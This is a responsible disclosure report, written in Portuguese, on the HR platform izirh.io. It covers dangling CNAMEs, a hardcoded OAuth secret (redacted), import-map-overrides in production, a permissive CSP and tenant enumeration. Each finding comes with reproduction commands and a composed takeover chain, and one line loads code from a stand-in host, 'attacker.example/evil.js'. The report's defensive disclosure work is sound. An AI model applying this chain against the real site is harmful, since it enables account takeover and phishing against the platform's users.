# Relatorio de Divulgacao Responsavel (Responsible Disclosure)

**Data do Reporte:** 23 de Junho de 2026
**Autor:** Isaac Nathan
**Alvo:** izirh.io
**Tipo de Atividade:** Reconhecimento passivo + analise estatica de bundles publicos
**Sem extracao de dados.** Apenas requisicoes GET/HEAD nao autenticadas contra endpoints ja publicos.

---

## 1. Sumario

Foi realizada analise de superficie de ataque da plataforma `izirh.io` em 22-23/Jun/2026. Nenhuma exploracao ativa foi executada. Todos os testes foram limitados a:

- Requisicoes HTTP nao autenticadas
- Analise de bundles JavaScript publicamente hospedados (Azure Blob Storage)
- DNs lookups publicos

Sete vulnerabilidades foram identificadas, das quais tres (V-001, V-003, V-006) sao consideradas criticas quando combinadas.

---

## 2. Escopo e Metodologia

### Em escopo
- Subdominios publicos de `izirh.io`
- Bundles JavaScript hospedados em `izishared.blob.core.windows.net`
- Endpoints publicos de `izi-api.izirh.io` e `izi-api-v2.izirh.io`

### Fora de escopo (nao testado)
- Forca bruta contra credenciais
- Tentativa de reivindicacao de recursos Azure
- Requisicoes autenticadas
- Exploracao de OAuth flows alem da descoberta de configuracao

### Ferramentas
- `curl`, `dig`
- Analise manual de bundles JS publicos
- CVSS v3.1 (FIRST calculator)

---

## 3. Achados

### V-001 — Subdomain Takeover via CNAME Orfao

**Severidade:** Critica
**CVSS v3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)
**CWE:** CWE-1188 (Insecure Default Initialization of Resource)

**Descricao:**
Tres subdominios de `izirh.io` apontam via CNAME para recursos Azure que nao existem mais. Um atacante pode reivindicar esses recursos e hospedar conteudo arbitrario em um subdominio legitimo.

**Evidencia reproduzivel:**

```bash
$ dig +short api-uat.izirh.io CNAME
izi-uat.azurewebsites.net.
$ dig +short izi-uat.azurewebsites.net
# (NXDOMAIN / sem resposta)

$ dig +short api-sit.izirh.io CNAME
izi-sit.azurewebsites.net.
$ dig +short izi-sit.azurewebsites.net
# (NXDOMAIN / sem resposta)

$ dig +short qa.izirh.io CNAME
agreeable-meadow-09858d50f.azurestaticapps.net.
$ curl -sI https://agreeable-meadow-09858d50f.azurestaticapps.net
# HTTP 404 / App not found
```

Subdominios afetados:
- `api-uat.izirh.io` → `izi-uat.azurewebsites.net` (deletado)
- `api-sit.izirh.io` → `izi-sit.azurewebsites.net` (deletado)
- `qa.izirh.io` → `agreeable-meadow-09858d50f.azurestaticapps.net` (app deletado)

**Impacto:**
- Cookie theft: Cookies scoped to `.izirh.io` seriam enviados ao subdominio assumido
- Bypass de politicas CORS (gateway confia em `*.izirh.io` via origem `sertec.izirh.io`)
- Bypass parcial de CSP (whitelist inclui `*.izirh.io`)
- Phishing altamente efetivo em infraestrutura confiavel
- Possivel sequestro de fluxos OAuth (mesmo registrador de CNAME)

**Remediacao:**
1. Imediato: Remover os registros CNAME orfaos no gerenciador de DNS, OU
2. Recriar os recursos Azure correspondentes para impedir reivindicacao por terceiros
3. Auditar todos os CNAMEs existentes para identificar outros dangling

---

### V-003 — Google OAuth Client Secret Hardcoded no Frontend Bundle

**Severidade:** Critica (quando combinada com V-001: encadeada vira account takeover)
**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
**CWE:** CWE-798 (Use of Hardcoded Credentials)

> **Nota de redacao:** Para este documento publico / comunicacao a autoridade nacional, os segredos reais foram removidos por `[REDACTED]`. O time da izirh recebera versao com valores reais via canal seguro.

**Descricao:**
O bundle JavaScript do modulo de callback do Google OAuth (MFE `recruitment`) contem um `client_secret` do Google OAuth hardcoded no codigo enviado ao navegador. Qualquer visitante pode extrair este valor inspecionando o bundle.

**Evidencia reproduzivel (sanitizada):**

Bundle disponivel publicamente em:
`https://izishared.blob.core.windows.net/mfes/recruitment/prod/build-440337/izi-mfe-recruitment.js`

Conteudo minimo de evidencia (valores reais omitidos):

```javascript
// Identificado em chunk de callback:
const oauthConfig = {
  client_id: "[REDACTED].apps.googleusercontent.com",
  client_secret: "[REDACTED]",  // VAZADO
  redirect_uri: `${window.location.origin}/auth/callback/google`,
  grant_type: "authorization_code"
};
```

**Impacto:**
- Com `client_id` + `client_secret` validos, terceiro pode executar o fluxo `authorization_code` trocando codigos por tokens.
- Combinado com V-001 (takeover de subdominio que pode receber redirects OAuth), atacante pode completar login como qualquer candidato.
- Viola diretamente a politica do Google para SPAs (RFC 8252 / OAuth 2.0 BCP, recomenda PKCE, sem `client_secret` no client-side).

**Remediacao:**
1. Remover `client_secret` do bundle imediatamente.
2. Rotacionar o secret atual no Google Cloud Console (considerar vazado).
3. Migrar para OAuth 2.0 com PKCE (fluxo Authorization Code with PKCE), padrao para SPAs.
4. Configurar client type como "Web application" e restringir `redirect_uri` aos dominios legitimos.

---

### V-006 — `import-map-overrides` Habilitado em Producao

**Severidade:** Critica (vetor de persistencia XSS → RCE client-side)
**CVSS v3.1:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)  *(UI:N — overrides nao dependem de interacao do usuario)*
**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

**Descricao:**
A biblioteca `import-map-overrides@2.2.0` esta carregada em todas as paginas de producao do shell `single-spa`. Esta biblioteca foi projetada para **ambientes de desenvolvimento** e permite que um modulo registrado no import map seja redirecionado para outra URL em tempo de execucao, sem rebuild.

A configuracao atual tenta bloquear isso com:

```html
<meta name="import-map-overrides-domains" content="denylist:prod.*">
```

Porem este controle e contornavel dependendo da versao da biblioteca e do contexto do navegador.

**Evidencia reproduzivel (structural):**

Atualmente visivel no HTML de:

```
https://izirh.io
https://sertec.izirh.io
```

```html
<script src="https://cdn.jsdelivr.net/npm/import-map-overrides@2.2.0/dist/import-map-overrides.js" nonce="..."></script>
<meta name="import-map-overrides-domains" content="denylist:prod.*">
```

**Impacto:**
Qualquer vetor XSS (incluindo aqueles introduzidos pelas permissoes CSP de V-005) pode ser encadeado para:
1. Executar `importMapOverrides.addOverride("@izi/mfe-recruitment", "https://attacker.example/evil.js")`
2. Substituir um MFE legitimo por codigo arbitrario
3. Persistir no `localStorage` da vitima, sobrevivendo a refreshes
4. Funcionar dentro do contexto confiavel de `*.izirh.io` (cookies, CSP, CORS)

Esta cadeia transforma um XSS tipicamente "self-only" em account takeover persistente.

**Remediacao:**
1. Remover `import-map-overrides` de todos os builds de producao.
2. Se override for necessario em staging/dev, servir build separado com a biblioteca.
3. Bloquear `denylist` nao e mitigation suficiente; remover e o unico fix correto.

---

### V-002 — Variaveis de Ambiente Inlineadas no HTML (sem protecao)

**Severidade:** Alta
**CVSS v3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)
**CWE:** CWE-200 (Exposure of Sensitive Information)

> **Nota:** IDs publicos (Google OAuth client_id, Facebook app_id, GTM, GA) nao sao "secrets" — sao identificadores publicos por design. Porem sua exposicao massiva cria superficie de ataque: phishing direcionado, manipulacao de analytics, abuso de providers.

**Descricao:**
O shell principal `<script>` boot inlineia as variaveis de ambiente de runtime no HTML enviado a todo visitante. Isso inclui todos os URLs de backend, IDs de OAuth, chaves de captcha e IDs de analytics.

**Evidencia reproduzivel:**

Ao abrir `https://izirh.io` (ou qualquer subdominio), o HTML contem:

```html
<script>
  window.__ENV__ = {
    BACKEND_URI: "https://izi-api.izirh.io",
    API_URI: "https://izi-api.izirh.io",
    API_V2_URI: "https://izi-api-v2.izirh.io",
    BACKEND_DS_URI: "https://izi-ds-functions-prod.izirh.io",
    GOOGLE_CLIENT_ID: "[REDACTED-public-app-id]",
    FACEBOOK_APP_ID: "[REDACTED-public-app-id]",
    LINKEDIN_CLIENT_ID: "[REDACTED-public-app-id]",
    LINKEDIN_LOGIN_URI_REDIRECT: "https://sertec.izirh.io/linkedinLoginRedirect",
    CAPTCHA_SITE_KEY: "[REDACTED-public-site-key]",
    GTM_ID: "[REDACTED]",
    GA_TRACKING_ID: "[REDACTED]"
    /* ... GA tracking IDs per MFE ... */
  };
</script>
```

**Impacto:**
- Superficie de ataque documentada (atacante sabe quais APIs existem, quais IDs OAuth abusar).
- Combinado com V-003 e V-001, atacante mapeia a cadeia de exploit inteira.
- GA/GTM IDs em texto puro permitem injecao de eventos falsificados (analytics poisoning).

**Remediacao:**
1. Servir configuracoes via endpoints autenticados.
2. Para valores genuinamente publicos (client_ids OAuth publicos), ao menos ofuscar a presenca (reduz attack surface enumeration).
3. Separar configuracoes sensiveis (URLs internos, tenants) das publicas.

**Importante:** Os IDs publicos de OAuth *na sua forma isolada* nao sao vuln — eles sao projetados para ser publicos. A vuln aqui e a enumeração completa em um so lugar, e a presenca de itens sensiveis (item 2 abaixo em V-003) que nao deveriam estar no mesmo bloco.

---

### V-004 — URL do Kudu/SCM Vazada em Pagina de Erro

**Severidade:** Media
**CVSS v3.1:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)

**Descricao:**
A pagina de erro padrao do Azure App Service (renderizada quando uma rota nao tratada dispara 503) expoe o endpoint Kudu/SCM interno do App Service.

**Evidencia reproduzivel:**

```bash
$ curl -sI https://sertec.izirh.io/auth/callback
HTTP/2 503

$ curl -s https://sertec.izirh.io/auth/callback | grep -i scm
# Resposta body inclui link:
# https://izi-mfe-root.scm.azurewebsites.net/detectors
```

**Impacto:**
- O endpoint Kudu em si exige Basic Auth (publicar credenciais do App Service).
- Porem, expor a URL elimina a fase de reconnaissance para ataques de bruteforce de publish profile.
- Combinado com vazamento previo de credenciais (caso tenham ocorrido em outros incidentes), fornece vetor direto de RCE para o App Service.

**Remediacao:**
1. Configurar custom error pages no Azure App Service (`web.config` ou Application Insights custom errors).
2. Garantir que stack traces, request URLs e links para `*.scm.azurewebsites.net` nunca cheguem ao navegador do usuario final.
3. Considerar desabilitar o Kudu/SCM em ambientes de producao via `WEBSITE_RUN_FROM_PACKAGE` e policies de SCM.

---

### V-005 — CSP Permissiva (`unsafe-eval` + `unsafe-inline`)

**Severidade:** Media (Critica quando encadeada com V-006)
**CVSS v3.1:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N)  *(S:C porque escala para V-006)*
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)

**Descricao:**
A politica CSP atualmente enviada permite `unsafe-eval` em `script-src` e `unsafe-inline` em `style-src`. As diretivas de `script-src` incluem lista ampla de dominios terceiros.

**Evidencia reproduzivel:**

```bash
$ curl -sI https://sertec.izirh.io | grep -i content-security-policy
content-security-policy: script-src 'self' 'unsafe-eval' 'nonce-...' https://*.izirh.io https://*.facebook.com ...
```

**Impacto:**
- `unsafe-eval` permite `eval()`, `new Function()`, `setTimeout(string)` — vetores classicos XSS.
- `unsafe-inline` permite `<style>` inline — vetor secundario de exfiltracao via CSS injection.
- Whitelist ampla aumenta supply-chain attack surface: comprometimento de qualquer provedor listado leva a XSS.

**Remediacao:**
1. Refatorar codigo que depende de `eval()` (tipicamente bundlers antigos ou libs dinamicas).
2. Substituir `unsafe-inline` por nonces ou hashes por requisicao.
3. Restringir whitelist de `script-src` ao minimo absoluto.

---

### V-007 — Enumeracao de Tenants via Endpoint Publico

**Severidade:** Baixa
**CVSS v3.1:** 2.7 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
**CWE:** CWE-204 (Observable Response Discrepancy)

**Descricao:**
O endpoint publico `GET /api/configurations/get-client-configurations?origin=<tenant>` retorna comportamentos discrepantes dependendo da existencia do tenant.

**Evidencia reproduzivel:**

```bash
$ curl -s "https://izi-api-v2.izirh.io/api/configurations/get-client-configurations?origin=sertec.izirh.io"
{}

$ curl -s "https://izi-api-v2.izirh.io/api/configurations/get-client-configurations?origin=xyz-inexistente.izirh.io"
{"error":"INTERNAL_ERROR"}

$ curl -s "https://izi-api-v2.izirh.io/api/configurations/get-client-configurations?origin=embraer.izirh.io"
{}
```

**Impacto:**
- Permite listar todos os clientes B2B que usam a plataforma sem autenticacao.
- Informacao comercial sensivel (quais empresas usam a izirh, e em qual subdominio).
- Auxilia ataques direcionados contra tenants especificos.

**Remediacao:**
1. Retornar resposta consistente (200 OK + objeto vazio, ou 404 identico) independente da existencia do tenant.
2. Idealmente requerir autenticacao para expor configuracao de tenant.

---

## 4. Cadeia de Exploit Composta (Informativo)

> Esta secao e informativa — nao foi executada, serve apenas para priorizacao.

| Etapa | Vuln usada | Resultado |
|---|---|---|
| 1 | V-001 | Atacante reivindica `qa.izirh.io` |
| 2 | V-002 + V-003 | Identifica client_id + secret real |
| 3 | V-006 | Acha mecanismo para persistencia |
| 4 | V-005 | CSP permite executar payload |
| → | Combinacao | RCE cliente-side dentro de `izirh.io` |

Mitigacao de **qualquer elo da cadeia** quebra o ataque. V-006 (import-map-overrides em prod) e o elo mais barato para remover.

---

## 5. Apêndice — Comandos de Reproducao Minimos

```bash
# V-001 — Dangling CNAMEs
dig +short api-uat.izirh.io CNAME
dig +short api-sit.izirh.io CNAME
dig +short qa.izirh.io CNAME

# V-002 — Variaveis de ambiente expostas
curl -s https://izirh.io | grep -E "BACKEND_URI|API_URI|CLIENT_ID|SITE_KEY"

# V-003 — Client secret no bundle
curl -s "https://izishared.blob.core.windows.net/mfes/recruitment/prod/build-440337/izi-mfe-recruitment.js" | grep -E "client_(id|secret)"

# V-004 — Kudu leak
curl -s https://sertec.izirh.io/auth/callback | grep -i scm.azurewebsites

# V-005 — CSP permissiva
curl -sI https://sertec.izirh.io | grep -i content-security-policy

# V-006 — import-map-overrides em prod
curl -s https://izirh.io | grep -E "import-map-overrides|import-map-overrides-domains"

# V-007 — Tenant enumeration
curl -s "https://izi-api-v2.izirh.io/api/configurations/get-client-configurations?origin=test.izirh.io"
```


---

## 6. Contato

<isaacnathandasilva@gmail.com>
<https://github.com/xAngryBadger>
---
